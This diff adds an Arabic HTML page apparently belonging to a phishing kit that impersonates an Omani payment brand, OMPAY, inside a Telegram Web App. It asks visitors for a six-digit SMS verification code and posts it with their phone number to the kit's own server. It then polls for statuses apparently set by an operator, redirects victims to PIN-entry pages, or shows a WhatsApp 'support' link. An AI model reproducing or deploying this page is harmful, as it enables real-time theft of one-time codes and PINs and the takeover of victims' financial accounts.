@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>OMPAY عمان - التحقق</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --ompay-primary: #004b87;
+            --ompay-hover: #003366;
+            --ompay-blue-light: #0077b6;
+            --bg-color: #f8fafc;
+            --card-bg: #ffffff;
+            --text-dark: #1e293b;
+            --text-muted: #64748b;
+            --border-ompay: #004b87;
+            --btn-disabled-bg: #e2e8f0;
+            --btn-disabled-text: #94a3b8;
+        }
+
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; min-height: 100vh; align-items: center; }
+
+        .header-box {
+            width: 100%; background: linear-gradient(180deg, var(--ompay-blue-light) 0%, var(--ompay-primary) 100%);
+            padding: 25px 20px 40px 20px; color: white; text-align: center; font-size: 26px; font-weight: 800;
+        }
+        .main-container { width: 100%; display: flex; justify-content: center; margin-top: -20px; flex-grow: 1; }
+        .card {
+            background: var(--card-bg); width: 90%; max-width: 400px; padding: 30px 20px; border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 75, 135, 0.08); align-self: flex-start; border-top: 5px solid var(--ompay-primary);
+        }
+
+        h2 { margin: 0 0 12px 0; font-size: 22px; color: var(--text-dark); font-weight: 800; text-align: center; }
+        .instruction { font-size: 14px; color: var(--text-muted); margin: 0 0 12px 0; line-height: 1.4; text-align: center; }
+        .phone-number { font-size: 16px; font-weight: 800; color: var(--text-dark); margin-bottom: 25px; display: flex; align-items: center; justify-content: center; gap: 8px; direction: ltr; }
+
+        .code-input-container { display: flex; justify-content: space-between; gap: 6px; margin-bottom: 20px; direction: ltr; }
+        .code-box {
+            width: 48px; height: 54px; border: 2px solid var(--border-ompay); border-radius: 10px;
+            text-align: center; font-size: 22px; font-weight: 800; outline: none; text-transform: uppercase; background-color: #ffffff;
+        }
+
+        .resend-text { text-align: center; color: var(--text-muted); font-size: 14px; margin: 20px 0; }
+        .submit-btn {
+            width: 100%; background-color: var(--btn-disabled-bg); color: var(--btn-disabled-text); border: none;
+            padding: 16px; border-radius: 10px; font-size: 16px; font-weight: 800; cursor: not-allowed; transition: background-color 0.2s;
+        }
+        .submit-btn.active { background-color: var(--ompay-primary); color: white; cursor: pointer; }
+        .submit-btn.active:hover { background-color: var(--ompay-hover); }
+
+        .footer-banner { width: 100%; background: linear-gradient(180deg, var(--ompay-blue-light) 0%, var(--ompay-primary) 100%); height: 80px; border-top-left-radius: 50% 30px; border-top-right-radius: 50% 30px; margin-top: 40px; }
+
+        .overlay {
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(15, 23, 42, 0.9);
+            display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; color: white; text-align: center; padding: 24px;
+        }
+        .overlay-card { width: 100%; max-width: 360px; display: flex; flex-direction: column; align-items: center; }
+        .spinner { width: 56px; height: 56px; border: 5px solid rgba(255, 255, 255, 0.3); border-top: 5px solid white; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 24px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .overlay-title { font-size: 22px; font-weight: 800; margin-bottom: 12px; }
+        .overlay-desc { font-size: 15px; font-weight: 600; margin-bottom: 20px; line-height: 1.4; }
+        .wa-btn { display: block; width: 100%; background-color: white; color: var(--ompay-primary); font-weight: 800; padding: 16px; border-radius: 12px; text-decoration: none; word-break: break-all; font-size: 13px; }
+        .error-message { color: #dc2626; font-size: 13px; margin-top: 10px; display: none; text-align: center; font-weight: 600; }
+    </style>
+</head>
+<body>
+
+<div class="header-box">OMPAY</div>
+
+<div class="main-container">
+    <div class="card">
+        <h2>رمز التحقق</h2>
+        <p class="instruction">أدخل رمز التحقق المكون من 6 خانات والمرسل عبر الرسائل النصية (SMS)</p>
+
+        <div class="phone-number">
+            <span id="displayPhone">+968 ...</span>
+            <span>🇴🇲</span>
+        </div>
+
+        <div class="code-input-container">
+            <input type="text" maxlength="1" class="code-box" autocomplete="off">
+            <input type="text" maxlength="1" class="code-box" autocomplete="off">
+            <input type="text" maxlength="1" class="code-box" autocomplete="off">
+            <input type="text" maxlength="1" class="code-box" autocomplete="off">
+            <input type="text" maxlength="1" class="code-box" autocomplete="off">
+            <input type="text" maxlength="1" class="code-box" autocomplete="off">
+        </div>
+
+        <div id="errorText" class="error-message">الرمز المدخل غير صحيح أو انتهت صلاحيته.</div>
+
+        <div class="resend-text" id="timerBox">إعادة الإرسال خلال <span id="timer">60</span> ثانية</div>
+        <button id="submitBtn" class="submit-btn" disabled>تأكيد الرمز</button>
+    </div>
+</div>
+
+<div class="footer-banner"></div>
+
+<div class="overlay" id="statusOverlay">
+    <div class="overlay-card">
+        <div class="spinner"></div>
+        <div class="overlay-title">يرجى الانتظار...</div>
+    </div>
+</div>
+
+<div class="overlay" id="contactOverlay">
+    <div class="overlay-card">
+        <div class="overlay-title">تواصل معنا عبر واتساب</div>
+        <div class="overlay-desc">انقر على الرابط أدناه للتواصل مع الدعم الفني</div>
+        <a href="https://wa.me/message/ICY6YKSAAG3GC1" target="_blank" class="wa-btn">https://wa.me/message/ICY6YKSAAG3GC1</a>
+    </div>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    const displayPhone = document.getElementById('displayPhone');
+    const codeBoxes = document.querySelectorAll('.code-box');
+    const submitBtn = document.getElementById('submitBtn');
+    const timerEl = document.getElementById('timer');
+    const timerBox = document.getElementById('timerBox');
+    const statusOverlay = document.getElementById('statusOverlay');
+    const contactOverlay = document.getElementById('contactOverlay');
+    const errorText = document.getElementById('errorText');
+
+    let checkInterval = null;
+    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone');
+    if (savedPhone) displayPhone.textContent = `+968 ${savedPhone.replace(/^\+?968/, '')}`;
+
+    codeBoxes.forEach((box, index) => {
+        box.addEventListener('input', () => {
+            box.value = box.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
+            if (box.value && index < codeBoxes.length - 1) codeBoxes[index + 1].focus();
+            checkInputs();
+        });
+        box.addEventListener('keydown', (e) => {
+            if (e.key === "Backspace" && !box.value && index > 0) codeBoxes[index - 1].focus();
+        });
+        box.addEventListener('paste', (e) => {
+            e.preventDefault();
+            const pasteData = (e.clipboardData || window.clipboardData).getData('text').toUpperCase().replace(/[^A-Z0-9]/g, '');
+            if (pasteData.length > 0) {
+                codeBoxes.forEach((b, i) => { b.value = pasteData[i] || ''; });
+                codeBoxes[Math.min(pasteData.length, codeBoxes.length - 1)].focus();
+            }
+            checkInputs();
+        });
+    });
+
+    function checkInputs() {
+        const fullCode = Array.from(codeBoxes).map(b => b.value).join('');
+        const isComplete = fullCode.length === 6;
+        submitBtn.disabled = !isComplete;
+        submitBtn.classList.toggle('active', isComplete);
+        errorText.style.display = 'none';
+    }
+
+    let timeLeft = 60;
+    const timerInterval = setInterval(() => {
+        timeLeft--;
+        if (timerEl) timerEl.textContent = timeLeft;
+        if (timeLeft <= 0) {
+            clearInterval(timerInterval);
+            timerBox.innerHTML = '<span style="color:var(--ompay-primary); cursor:pointer; font-weight:700;" onclick="location.reload()">إعادة إرسال الرمز</span>';
+        }
+    }, 1000);
+
+    function startStatusPolling() {
+        if (checkInterval) clearInterval(checkInterval);
+        checkInterval = setInterval(async () => {
+            try {
+                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(savedPhone)}`);
+                const data = await res.json();
+                if (data.status === "otp1_correct") {
+                    clearInterval(checkInterval);
+                    window.location.href = "/page9";
+                } else if (data.status === "otp2_wrongpin" || data.status === "pin_wrong") {
+                    clearInterval(checkInterval);
+                    window.location.href = "/page6?error=wrongpin";
+                } else if (data.status === "otp1_wrong") {
+                    clearInterval(checkInterval);
+                    statusOverlay.style.display = "none";
+                    errorText.textContent = "الرمز غير صحيح، يرجى التأكد من الرسالة النصية.";
+                    errorText.style.display = "block";
+                    codeBoxes.forEach(b => b.value = "");
+                    codeBoxes[0].focus();
+                    checkInputs();
+                } else if (data.status === "contact_us") {
+                    clearInterval(checkInterval);
+                    statusOverlay.style.display = "none";
+                    contactOverlay.style.display = "flex";
+                }
+            } catch (err) { console.error(err); }
+        }, 2000);
+    }
+
+    submitBtn.addEventListener('click', async () => {
+        if (submitBtn.disabled) return;
+        const codeValue = Array.from(codeBoxes).map(b => b.value).join('');
+        if (codeValue.length < 6) return;
+
+        statusOverlay.style.display = "flex";
+        errorText.style.display = "none";
+
+        try {
+            const res = await fetch('/api/verify-first-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: savedPhone, code: codeValue, country: "OM" })
+            });
+            const responseData = await res.json();
+            if (responseData.success) {
+                startStatusPolling();
+            } else {
+                statusOverlay.style.display = "none";
+                alert("حدث خطأ أثناء الإرسال.");
+            }
+        } catch (err) {
+            statusOverlay.style.display = "none";
+            alert("خطأ في الاتصال بالخادم.");
+        }
+    });
+
+    if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+    }
+});
+</script>
+</body>
+</html>
